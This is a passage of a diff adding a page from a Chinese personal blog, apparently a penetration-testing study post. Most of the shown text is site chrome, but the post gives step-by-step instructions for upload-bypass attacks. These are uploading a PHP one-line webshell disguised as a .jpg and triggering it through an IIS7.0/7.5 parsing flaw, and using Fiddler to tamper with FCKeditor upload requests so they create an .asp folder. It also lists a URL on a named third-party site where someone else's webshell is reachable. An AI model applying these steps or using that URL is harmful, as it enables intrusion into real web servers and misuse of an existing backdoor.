但不知道密码"></a>五：成功访问别人的一句话木马页面，<a href="http://glavesoft.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg" target="_blank" rel="external">http://glavesoft.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg</a>  但不知道密码</h4><p><a href="http://glavesoft.com/UploadFiles\EditorFile\file\2_asp;2.jpg" target="_blank" rel="external">http://glavesoft.com/UploadFiles\EditorFile\file\2_asp;2.jpg</a> 这个是图片木马，没有成功利用iis6.0解析漏洞还是图片，下载下来用记事本打开找到密码。</p>
+<h4 id="六：IIS7-0-7-5-通杀oday，把php一句话木马后缀改成1-jpg传上去，找出一句话的路径后，在1-jpg的后面添加-php-例如：-php"><a href="#六：IIS7-0-7-5-通杀oday，把php一句话木马后缀改成1-jpg传上去，找出一句话的路径后，在1-jpg的后面添加-php-例如：-php" class="headerlink" title="六：IIS7.0/7.5 通杀oday，把php一句话木马后缀改成1.jpg传上去，找出一句话的路径后，在1.jpg的后面添加/.php  例如：/.php"></a>六：IIS7.0/7.5 通杀oday，把php一句话木马后缀改成1.jpg传上去，找出一句话的路径后，在1.jpg的后面添加/.php  例如：/.php</h4><p>( 建立文件夹 . 变 _ 的突破方法 )<br>利用Fiddler web debugger 这款工具来进行修改数据包，从而达到突破的目的。<br>注意：安装Fiddler web debugger，需要安装.net环境以及.net的SP2补丁方可运行！<br>1.打开fck的上传页面，例如：fckeditor/editor/filemanager/browser/default/connectors/test.html<br>2.再打开Fiddler web debugger这款工具，点击设置–自动断点–选择 “请求之前”<br>3.接着打开fck的上传页面，创建文件夹，并输入你想要创建的文件名，例如：x.asp<br>4.然后返回到Fiddler web debugger这款工具里，选择链接–点击右侧的嗅探<br>5.修改currentfolder内的参数，改成你要建立的文件夹名字，如：x.asp<br>6.然后点击右侧的：run to completion<br>7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/渗透学习/">渗透学习</a>
+  </div>
+
+        <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina"></a>
+    <a href="#" class="bds_tqq" data-cmd="tqq"></a>
+    <a href="#" class="bds_renren" data-cmd="renren"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin"></a>
+</div>
+
+<script>
+    window._bd_share_config = {
+        "common": {
+            "bdSnsKey": {},
+            "bdText": "",
+            "bdMini": "2",
+            "bdPic": "",
+            "bdStyle": "0",
+            "bdSize": "16"
+        },
+        "share": {},
+        "image": {
+            "viewList": ["qzone", "tsina", "tqq", "renren", "weixin"],
+            "viewText": “分享到",
+            "viewSize": "16"
+        },
+        "selectShare": {
+            "bdContainerClass": null,
+            "bdSelectMiniList": ["qzone", "tsina", "tqq", "renren", "weixin"]
+        }
+    };
+    with(document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
+</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/02/16/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <SCRIPT language=javascript>
+function search(formname) {
+    formname.method = "get";
+    formname.action = "http://www.baidu.com/baidu";
+    document.search_form.word.value = document.search_form.word.value + " site:mjiayou.com";
+    return true;
+}
+</SCRIPT>
+
+<div class="search">
+    <form name="search_form" target="_blank" onsubmit="search(this)">
+        <input type="search" name="word" results="0" placeholder="百度站内搜索" onblur="this.value=''">
+        <!-- <input type="submit" value="搜索"> -->
+    </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Linux基础/">Linux基础</a><small>3</small></li>
+  
+    <li><a href="/tags/php/">php</a><small>1</small></li>
+  
+    <li><a href="/tags/python/">python</a><small>3</small></li>
+  
+    <li><a href="/tags/渗透学习/">渗透学习</a><small>7</small></li>
+  
+    <li><a href="/tags/生活感悟/">生活感悟</a><small>2</small></li>
+  
+    <li><a href="/tags/读书笔记/">读书笔记</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  <iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=1&ptype=1&speed=0&skin=3&isTitle=0&noborder=1&isWeibo=0&isFans=0&uid=3869837461&verifier=7b3bd9e7&dpc=1"></iframe>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 xiaofeng
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.useso.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
